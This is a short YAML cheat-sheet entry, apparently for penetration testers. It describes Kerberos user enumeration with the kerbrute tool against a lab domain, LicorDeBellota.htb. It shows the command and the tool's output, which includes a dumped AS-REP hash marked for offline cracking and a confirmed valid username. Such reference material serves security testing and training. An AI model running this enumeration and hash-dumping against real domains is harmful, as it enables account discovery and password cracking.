---
functions:
  enumeration:
    - description: Kerberos User Enumeration
      code: |

        > kerbrute userenum -d LicorDeBellota.htb --dc LicorDeBellota.htb users -v [--downgrade]
            __             __               __     
           / /_____  _____/ /_  _______  __/ /____ 
          / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
         / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
        /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

        Version: dev (n/a) - 02/15/22 - Ronnie Flathers @ropnop

        2022/02/15 15:58:23 >  Using KDC(s):
        2022/02/15 15:58:23 >   LicorDeBellota.htb:88

        2022/02/15 15:58:23 >  [+] kaorz has no pre auth required. Dumping hash to crack offline:
        $krb5asrep$18$kaorz@LICORDEBELLOTA.HTB:ddd8cf87d374872feee69cfe44550853$1e59bc86fec952310924ed70097c5bc0683e4ea6b46d28087689f34a67e9c26ecda81b7126e23da181b7238aaa30fbeab0e0f5eb3ae8e982e4ff7f4f6ccefba5d46de0a5e6c95bc7448ec55704335e029f358d96808e73f54c356ab56e2492f5c8229a9ec8650c9ccb68dc64fb7c3bd8565a5dcb95ed66088ac12f74950f14ef26fe8ef708f3cc60c62528e28b6da6831294f25ad48e82cb78c4ccc1acaba8d9eef4c3beb21d779ca3829661c89cf6b7121c6eea30839cbed5fa206d1858d0a31398f983f4f71c75b2c2c2fc56d92a7ed28b584201eb29d2c34a5a52254029bf3fa95d11d6188594f5665ddde5662004a50cf8d0d1b3814ee8c1755cd1bfb9f7e982b24de48ae5c56b657c4f
        2022/02/15 15:58:23 >  [+] VALID USERNAME:   kaorz@LicorDeBellota.htb

        NOTE: USE THE LASTEST FROM SOURCE


resources: |
  https://github.com/ropnop/kerbrute
---
